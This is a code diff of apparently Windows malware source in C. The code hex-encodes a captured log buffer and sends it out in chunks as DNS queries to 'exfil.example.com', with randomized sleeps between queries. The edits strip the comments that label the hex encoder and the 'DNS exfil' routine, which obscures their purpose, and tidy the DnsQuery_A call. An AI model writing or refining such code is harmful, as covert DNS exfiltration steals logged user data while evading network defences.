@@ -21,8 +21,7 @@ void mem_log(const char *data) {
     }
 }
 
-// Hex encoder
-void hex_encode(const unsigned char *in, size_t len, char *out) {
+void hex_enc(const unsigned char *in, size_t len, char *out) {
     const char *hex = "0123456789abcdef";
     for (size_t i = 0; i < len; i++) {
         out[i * 2] = hex[in[i] >> 4];
@@ -31,7 +30,6 @@ void hex_encode(const unsigned char *in, size_t len, char *out) {
     out[len * 2] = '\0';
 }
 
-// DNS exfil
 void dns_exfil(const char *hexdata, const char *domain) {
     char fullQuery[256];
     static int counter = 0;
@@ -39,7 +37,7 @@ void dns_exfil(const char *hexdata, const char *domain) {
     snprintf(fullQuery, sizeof(fullQuery), "%02x.%s.%s", counter++, hexdata, domain);
 
     DNS_RECORD *record;
-    DnsQuery_A(fullQuery, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &record, NULL);
+    DnsQuery_A(fullQuery, DNS_TYPE_A, DNS_QUERY_STANDARD, 0, &record, 0);
     if (record) DnsRecordListFree(record, DnsFreeRecordList);
 }
 
@@ -50,7 +48,7 @@ void actual_exfil() {
 
     for (size_t i = 0; i < logIndex; i += chunk_size) {
         size_t len = (i + chunk_size < logIndex) ? chunk_size : (logIndex - i);
-        hex_encode((unsigned char*)&logBuffer[i], len, hex);
+        hex_enc((unsigned char*)&logBuffer[i], len, hex);
         dns_exfil(hex, "exfil.example.com");
         Sleep(100 + (rand() % 30));
     }
